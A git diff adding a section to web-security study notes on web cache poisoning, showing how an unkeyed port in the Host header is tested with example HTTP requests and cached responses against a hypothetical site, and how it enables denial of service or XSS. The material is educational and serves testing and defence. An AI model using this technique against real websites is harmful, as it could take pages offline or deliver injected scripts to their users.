@@ -85,4 +85,38 @@ Poc: [Targeted web cache poisoning using an unknown header](https://portswigger.
 
 ---
 
-## 
+## Exploiting cache key implementation flaws
+
+## Exploiting unkeyed port
+
+Let's say that our hypothetical cache oracle is the target website's home page. This automatically redirects users to a region-specific page. It uses the Host header to dynamically generate the Location header in the response:
+
+```
+GET / HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 302 Moved Permanently
+Location: https://vulnerable-website.com/en
+Cache-Status: miss
+```
+
+To test whether the port is excluded from the cache key, we first need to request an ```arbitrary port``` and make sure that we receive a fresh response from the server that reflects this input:
+```
+GET / HTTP/1.1
+Host: vulnerable-website.com:1337
+
+HTTP/1.1 302 Moved Permanently
+Location: https://vulnerable-website.com:1337/en
+Cache-Status: miss
+```
+Next, we'll send another request, but this time we won't specify a port:
+
+```
+GET / HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 302 Moved Permanently
+Location: https://vulnerable-website.com:1337/en
+Cache-Status: hit
+```
+As you can see, we have been served our cached response even though the Host header in the request does not specify a port. This might enable you to construct a denial-of-service attack by simply adding an arbitrary port to the request. All users who browsed to the home page would be redirected to a dud port, effectively taking down the home page until the cache expired. This kind of attack can be escalated further if the website allows you to specify a non-numeric port. You could use this to inject an XSS payload, for example.
